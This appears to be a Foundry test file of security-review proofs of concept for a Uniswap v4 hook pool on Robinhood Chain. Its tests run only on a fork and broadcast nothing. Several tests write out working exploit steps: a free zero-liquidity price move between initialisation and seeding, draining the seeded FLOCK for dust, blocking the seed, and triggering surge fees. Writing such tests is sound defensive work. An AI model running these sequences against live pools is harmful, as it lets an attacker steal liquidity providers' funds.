// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// Operational / script-safety review PoCs. Run with:
//   forge test --match-path "test/review/*" --fork-url robinhood -vv
// Every test is a no-op unless the fork is Robinhood Chain (4663). Nothing here broadcasts.

import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {IERC721} from "forge-std/interfaces/IERC721.sol";

import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {LPFeeLibrary} from "@uniswap/v4-core/src/libraries/LPFeeLibrary.sol";
import {LiquidityAmounts} from "@uniswap/v4-core/test/utils/LiquidityAmounts.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {Actions} from "@uniswap/v4-periphery/src/libraries/Actions.sol";
import {Constants} from "@uniswap/v4-core/test/utils/Constants.sol";

import {EasyPosm} from "../utils/libraries/EasyPosm.sol";
import {BaseTest} from "../utils/BaseTest.sol";
import {RobinhoodV4} from "../../src/libraries/RobinhoodV4.sol";
import {FlockStockPairHook} from "../../src/FlockStockPairHook.sol";
import {RegisterPoolScript} from "../../script/01_RegisterPool.s.sol";
import {InitializeAndSeedScript} from "../../script/02_InitializeAndSeed.s.sol";

/// @dev Exposes the real script internals so the review can exercise the exact code paths.
contract RegisterPoolProbe is RegisterPoolScript {
    function safeJson(address to, bytes memory data) external returns (string memory) {
        return _safeTxBuilderJson(to, data);
    }
}

contract SeedProbe is InitializeAndSeedScript {
    function sanity(int24 initTick, bool flockIs1) external view {
        _sanityCheckTick(initTick, flockIs1);
    }

    function ticksOf(uint256 num, uint256 den) external pure returns (int256) {
        return _ticksOf(num, den);
    }
}

contract OpsReviewFork is BaseTest {
    using EasyPosm for IPositionManager;
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    uint160 constant FLAGS = uint160(Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG);
    bytes32 constant SWAP_SIG =
        keccak256("StockPairSwap(bytes32,address,address,bool,int128,int128,int256,uint24,int24)");

    int24 constant INIT_TICK = 90_780;
    int24 constant TICK_SPACING = 60;
    uint256 constant SEED_FLOCK = 2_600_000e18;

    IERC20 flock = IERC20(RobinhoodV4.FLOCK);
    IERC20 googl = IERC20(RobinhoodV4.GOOGL);
    address owner = RobinhoodV4.FLOCK_SAFE;
    address attacker = makeAddr("attacker");
    address trader = makeAddr("trader");

    FlockStockPairHook hook;
    PoolKey key;
    PoolId poolId;

    // Script 01 defaults (surge off) unless a test overrides.
    FlockStockPairHook.FeeConfig cfg = FlockStockPairHook.FeeConfig({
        baseFee: 3_000,
        minFee: 2_500,
        maxFee: 10_000,
        launchFee: 10_000,
        weekendFee: 6_000,
        surgeFee: 0,
        surgeTickThreshold: 500,
        surgeWindow: 300,
        launchSeconds: 1800
    });

    modifier onlyFork() {
        if (block.chainid != RobinhoodV4.CHAIN_ID) return;
        _;
    }

    function setUp() public {
        if (block.chainid != RobinhoodV4.CHAIN_ID) return;
        deployArtifactsAndLabel();

        address hookAddr = address(FLAGS ^ (0x7171 << 144));
        deployCodeTo(
            "FlockStockPairHook.sol:FlockStockPairHook", abi.encode(poolManager, RobinhoodV4.FLOCK, owner), hookAddr
        );
        hook = FlockStockPairHook(hookAddr);

        key = PoolKey(
            Currency.wrap(RobinhoodV4.GOOGL),
            Currency.wrap(RobinhoodV4.FLOCK),
            LPFeeLibrary.DYNAMIC_FEE_FLAG,
            TICK_SPACING,
            IHooks(hook)
        );
        poolId = key.toId();

        // Step 01: owner registers.
        vm.prank(owner);
        hook.registerPool(key, cfg);

        // The seeding wallet holds the FLOCK and has the same Permit2 approvals script 02 creates.
        deal(RobinhoodV4.FLOCK, address(this), SEED_FLOCK * 2);
        flock.approve(address(permit2), type(uint256).max);
        permit2.approve(RobinhoodV4.FLOCK, address(positionManager), type(uint160).max, type(uint48).max);
        googl.approve(address(permit2), 1);
        permit2.approve(RobinhoodV4.GOOGL, address(positionManager), 1, type(uint48).max);
    }

    // ------------------------------------------------------------------ helpers (mirror script 02)

    function _floor(int24 tick, int24 spacing) internal pure returns (int24) {
        int24 t = (tick / spacing) * spacing;
        if (tick < 0 && t != tick) t -= spacing;
        return t;
    }

    /// @dev Script 02 lines 97-126 + 171-178: band anchored at `anchorTick`, single-sided FLOCK, mint via posm.
    function _seedAt(int24 anchorTick, address recipient) internal returns (uint256 tokenId, int24 lo, int24 hi) {
        hi = _floor(anchorTick, TICK_SPACING);
        lo = hi - 60 * TICK_SPACING;
        uint160 sqrtPrice = TickMath.getSqrtPriceAtTick(anchorTick);
        uint128 liq = LiquidityAmounts.getLiquidityForAmounts(
            sqrtPrice, TickMath.getSqrtPriceAtTick(lo), TickMath.getSqrtPriceAtTick(hi), 0, SEED_FLOCK
        );
        (tokenId,) = positionManager.mint(
            key, lo, hi, liq, 1, SEED_FLOCK + SEED_FLOCK / 1000, recipient, block.timestamp + 3600, Constants.ZERO_BYTES
        );
    }

    function _ownerInit(int24 tick) internal {
        vm.prank(owner);
        hook.initializePool(key, TickMath.getSqrtPriceAtTick(tick));
    }

    /// @dev Zero-liquidity price move: sell 1 wei FLOCK oneForZero; nothing is transferred, tick runs to the limit.
    function _freeMoveUp(address who) internal returns (uint256 gasUsed) {
        deal(RobinhoodV4.FLOCK, who, 1e18);
        vm.startPrank(who, who);
        flock.approve(address(swapRouter), type(uint256).max);
        uint256 g0 = gasleft();
        swapRouter.swapExactTokensForTokens({
            amountIn: 1,
            amountOutMin: 0,
            zeroForOne: false,
            poolKey: key,
            hookData: Constants.ZERO_BYTES,
            receiver: who,
            deadline: block.timestamp + 1
        });
        gasUsed = g0 - gasleft();
        vm.stopPrank();
    }

    function _buy(address who, uint256 googlIn) internal returns (BalanceDelta d, uint256 gasUsed) {
        deal(RobinhoodV4.GOOGL, who, googlIn);
        vm.startPrank(who, who);
        googl.approve(address(swapRouter), type(uint256).max);
        uint256 g0 = gasleft();
        d = swapRouter.swapExactTokensForTokens({
            amountIn: googlIn,
            amountOutMin: 0,
            zeroForOne: true,
            poolKey: key,
            hookData: Constants.ZERO_BYTES,
            receiver: who,
            deadline: block.timestamp + 1
        });
        gasUsed = g0 - gasleft();
        vm.stopPrank();
    }

    function _tick() internal view returns (int24 t) {
        (, t,,) = poolManager.getSlot0(poolId);
    }

    function _lastSwapFee() internal returns (bool found, uint24 fee) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].emitter == address(hook) && logs[i].topics.length == 4 && logs[i].topics[0] == SWAP_SIG) {
                found = true;
                (,,,, fee,) = abi.decode(logs[i].data, (bool, int128, int128, int256, uint24, int24));
            }
        }
    }

    // ------------------------------------------------------------------ 1. third-party initialise is blocked

    function test_thirdPartyInitializeBlocked() public onlyFork {
        vm.prank(attacker, attacker);
        vm.expectRevert();
        poolManager.initialize(key, TickMath.getSqrtPriceAtTick(INIT_TICK + 60_000));
        // Through PositionManager.initializePool the revert is swallowed and the pool simply stays uninitialised.
        vm.prank(attacker, attacker);
        int24 r = positionManager.initializePool(key, TickMath.getSqrtPriceAtTick(INIT_TICK + 60_000));
        assertEq(r, type(int24).max, "posm swallows the hook revert");
        assertFalse(hook.poolState(poolId).initialized);
        (uint160 sq,,,) = poolManager.getSlot0(poolId);
        assertEq(sq, 0, "pool not initialised");
    }

    // ------------------------------------------------------------------ 2. init -> seed gap: free price move

    /// Between the (Safe) `initializePool` tx and the seed tx the pool is live with ZERO liquidity. Anyone can move
    /// its price to any tick for free (a 1-wei swap through empty range transfers nothing).
    function test_gapBetweenInitAndSeed_priceMovableForFree() public onlyFork {
        _ownerInit(INIT_TICK);
        uint256 bal = flock.balanceOf(attacker);
        uint256 gas = _freeMoveUp(attacker);
        console2.log("tick after free move:", int256(_tick()));
        console2.log("free move gas:", gas);
        assertEq(flock.balanceOf(attacker), bal + 1e18, "mover spent nothing");
        assertGt(_tick(), TickMath.MAX_TICK - 100, "tick pinned near MAX_TICK");
        FlockStockPairHook.PoolState memory st = hook.poolState(poolId);
        assertEq(st.swapCount, 1, "zero-amount swap counted");
        assertEq(st.uniqueTraders, 1, "zero-amount swap counts a unique trader");
        assertEq(st.flockVolume, 0);
    }

    /// Script 02 "seed-only mode" (lines 87-95) anchors the band at the LIVE tick and skips both the tick sanity
    /// check (line 128) and the post-price check (line 151). After a free move the whole seed is placed where
    /// FLOCK is worth ~0 GOOGL and can be bought for dust.
    function test_seedOnlyMode_afterFreeMove_seedIsDrainedForDust() public onlyFork {
        _ownerInit(INIT_TICK);
        _freeMoveUp(attacker);
        int24 liveTick = _tick();
        console2.log("live tick used by seed-only mode:", int256(liveTick));

        (, int24 lo, int24 hi) = _seedAt(liveTick, owner);
        console2.log("band tickLower:", int256(lo));
        console2.log("band tickUpper:", int256(hi));
        assertLt(flock.balanceOf(address(this)), SEED_FLOCK + 10e18, "2.6M FLOCK left the seeding wallet");

        // Attacker buys the entire seed with 1e12 wei GOOGL (0.000001 GOOGL ~ $0.0003).
        uint256 pmFlockBefore = flock.balanceOf(address(poolManager));
        (BalanceDelta d,) = _buy(attacker, 1e12);
        uint256 flockOut = uint256(int256(d.amount1()));
        uint256 googlIn = uint256(-int256(d.amount0()));
        console2.log("attacker paid GOOGL wei:", googlIn, " received FLOCK:", flockOut / 1e18);
        assertGt(flockOut, SEED_FLOCK * 99 / 100, "attacker takes >99% of the seed");
        assertLt(googlIn, 1e12 + 1);
        assertLt(flock.balanceOf(address(poolManager)), pmFlockBefore - SEED_FLOCK * 99 / 100);
    }

    /// Same gap, but the mover pushes the price DOWN: the honest seed tx (band below INIT_TICK, amount0Max = 1 wei)
    /// then needs GOOGL and reverts -> launch stuck until someone moves the price back.
    function test_gapBetweenInitAndSeed_priceMovedDown_seedReverts() public onlyFork {
        _ownerInit(INIT_TICK);
        deal(RobinhoodV4.GOOGL, attacker, 1);
        vm.startPrank(attacker, attacker);
        googl.approve(address(swapRouter), 1);
        swapRouter.swapExactTokensForTokens({
            amountIn: 1,
            amountOutMin: 0,
            zeroForOne: true,
            poolKey: key,
            hookData: Constants.ZERO_BYTES,
            receiver: attacker,
            deadline: block.timestamp + 1
        });
        vm.stopPrank();
        console2.log("tick after free move down:", int256(_tick()));
        assertLt(_tick(), TickMath.MIN_TICK + 100);
        vm.expectRevert();
        this.seedAtExternal(INIT_TICK);
    }

    function seedAtExternal(int24 t) external {
        _seedAt(t, owner);
    }

    /// Pausing before init closes the gap: swaps (including zero-amount moves) revert while paused.
    function test_pauseClosesTheGap() public onlyFork {
        vm.prank(owner);
        hook.setPaused(poolId, true);
        _ownerInit(INIT_TICK);
        deal(RobinhoodV4.FLOCK, attacker, 1e18);
        vm.startPrank(attacker, attacker);
        flock.approve(address(swapRouter), type(uint256).max);
        vm.expectRevert();
        swapRouter.swapExactTokensForTokens({
            amountIn: 1,
            amountOutMin: 0,
            zeroForOne: false,
            poolKey: key,
            hookData: Constants.ZERO_BYTES,
            receiver: attacker,
            deadline: block.timestamp + 1
        });
        vm.stopPrank();
        _seedAt(INIT_TICK, owner); // seeding works while paused (no liquidity hooks)
        vm.prank(owner);
        hook.setPaused(poolId, false);
        (BalanceDelta d,) = _buy(trader, 1e18);
        assertGt(int256(d.amount1()), 0);
    }

    // ------------------------------------------------------------------ 3. empty region above spot -> surge griefing (if surge on)

    function test_emptyRegionAboveSpot_freeMoveTriggersSurgeFeeWhenEnabled() public onlyFork {
        FlockStockPairHook.FeeConfig memory c = cfg;
        c.surgeFee = 10_000; // README default schedule had surge enabled
        vm.prank(owner);
        hook.setFeeConfig(poolId, c);
        _ownerInit(INIT_TICK);
        _seedAt(INIT_TICK, owner);
        vm.warp(block.timestamp + 3600); // past launch decay
        assertEq(hook.previewFee(poolId), 3_000);
        _freeMoveUp(attacker);
        vm.warp(block.timestamp + 10);
        assertEq(hook.previewFee(poolId), 10_000, "next buyer pays surge because of a zero-value move");
        vm.recordLogs();
        _buy(trader, 1e18);
        (bool found, uint24 fee) = _lastSwapFee();
        assertTrue(found);
        assertEq(fee, 10_000);
    }

    // ------------------------------------------------------------------ 4. Safe Transaction Builder JSON shape

    function test_safeTxBuilderJson_shape() public onlyFork {
        RegisterPoolProbe probe = new RegisterPoolProbe();
        bytes memory data = abi.encodeCall(FlockStockPairHook.registerPool, (key, cfg));
        string memory json = probe.safeJson(address(hook), data);
        console2.log(json);
        assertTrue(vm.keyExistsJson(json, ".version"), "version");
        assertTrue(vm.keyExistsJson(json, ".chainId"), "chainId");
        assertTrue(vm.keyExistsJson(json, ".meta.name"), "meta must be an object with name");
        assertTrue(vm.keyExistsJson(json, ".transactions[0].to"), "transactions must be an array of objects");
        assertEq(vm.parseJsonAddress(json, ".transactions[0].to"), address(hook));
        assertEq(vm.parseJsonString(json, ".transactions[0].value"), "0");
        console2.log("createdAt present (required by tx-builder BatchFile type):", vm.keyExistsJson(json, ".createdAt"));
        console2.log("operation key present (not part of tx-builder schema):", vm.keyExistsJson(json, ".transactions[0].operation"));
    }

    // ------------------------------------------------------------------ 5. tick sanity-check math against live FLOCK/USDG

    function test_sanityCheckMath_liveFlockUsdg() public onlyFork {
        SeedProbe probe = new SeedProbe();
        console2.log("ticksOf(1e12,1) =", probe.ticksOf(1e12, 1));
        console2.log("ticksOf(343.74e6,1e6) =", probe.ticksOf(343_740_000, 1e6));
        vm.setEnv("STOCK_USD_E6", "343740000");
        vm.setEnv("MAX_TICK_DEVIATION", "2000");
        probe.sanity(INIT_TICK, true); // must pass for the documented pilot tick
        vm.expectRevert(bytes("Seed: INIT_TICK deviates too much from implied price"));
        probe.sanity(INIT_TICK + 2_500, true);
        vm.expectRevert(bytes("Seed: INIT_TICK deviates too much from implied price"));
        probe.sanity(-INIT_TICK, true); // sign error would be caught
        probe.sanity(-INIT_TICK, false); // FLOCK = currency0 pools use the negated tick
        vm.expectRevert();
        probe.ticksOf(uint256(1) << 64, 1); // (num << 192) overflow fails closed
        vm.setEnv("STOCK_USD_E6", "0");
        probe.sanity(-INIT_TICK, true); // default env: guard silently skipped (opt-in)
    }

    // ------------------------------------------------------------------ 6. gas overhead of the hook per swap

    function test_gasOverhead_hookedVsHookless() public onlyFork {
        _ownerInit(INIT_TICK);
        _seedAt(INIT_TICK, owner);
        (, uint256 gFirst) = _buy(trader, 1e18); // cold netFlock + firstTradeAt (2 new slots) + first band entry
        (, uint256 gRepeat) = _buy(trader, 1e18); // warm
        address trader2 = makeAddr("trader2");
        (, uint256 gFirst2) = _buy(trader2, 1e18);

        PoolKey memory usdgKey =
            PoolKey(Currency.wrap(RobinhoodV4.FLOCK), Currency.wrap(RobinhoodV4.USDG), 2500, 25, IHooks(address(0)));
        deal(RobinhoodV4.FLOCK, trader, 10_000e18);
        vm.startPrank(trader, trader);
        flock.approve(address(swapRouter), type(uint256).max);
        uint256 g0 = gasleft();
        swapRouter.swapExactTokensForTokens({
            amountIn: 1_000e18,
            amountOutMin: 0,
            zeroForOne: true,
            poolKey: usdgKey,
            hookData: Constants.ZERO_BYTES,
            receiver: trader,
            deadline: block.timestamp + 1
        });
        uint256 gHookless = g0 - gasleft();
        vm.stopPrank();

        console2.log("hooked swap gas, first trade of trader   :", gFirst);
        console2.log("hooked swap gas, repeat trade            :", gRepeat);
        console2.log("hooked swap gas, first trade of trader 2 :", gFirst2);
        console2.log("hookless FLOCK/USDG swap gas (reference) :", gHookless);
    }

    // ------------------------------------------------------------------ 7. Safe as LP NFT recipient

    function test_safeReceivesNftAndCanExitByDirectCall() public onlyFork {
        _ownerInit(INIT_TICK);
        (uint256 tokenId,,) = _seedAt(INIT_TICK, owner);
        assertEq(IERC721(address(positionManager)).ownerOf(tokenId), owner, "Safe owns the LP NFT");
        assertGt(owner.code.length, 0, "Safe is a contract on the fork");

        bytes memory actions = abi.encodePacked(uint8(Actions.DECREASE_LIQUIDITY), uint8(Actions.TAKE_PAIR));
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encode(tokenId, uint256(1e18), uint128(0), uint128(0), bytes(""));
        params[1] = abi.encode(key.currency0, key.currency1, owner);
        bytes memory call_ = abi.encodeCall(
            IPositionManager.modifyLiquidities, (abi.encode(actions, params), block.timestamp + 7 days)
        );
        console2.log("Safe decreaseLiquidity calldata (to PositionManager):");
        console2.logBytes(call_);
        uint256 before = flock.balanceOf(owner);
        vm.prank(owner);
        (bool ok,) = address(positionManager).call(call_);
        assertTrue(ok, "Safe can decrease liquidity directly");
        assertGt(flock.balanceOf(owner), before, "FLOCK returned to the Safe");
    }

    // ------------------------------------------------------------------ 8. block.number semantics on the fork

    function test_blockNumberOnForkIsL2NotL1() public onlyFork {
        // Live chain: block.number inside the EVM is the Ethereum L1 block (~25.9M). Fork: L2 block (~53M).
        console2.log("fork block.number:", block.number);
        assertGt(block.number, 50_000_000, "fork exposes the L2 block number");
    }
}
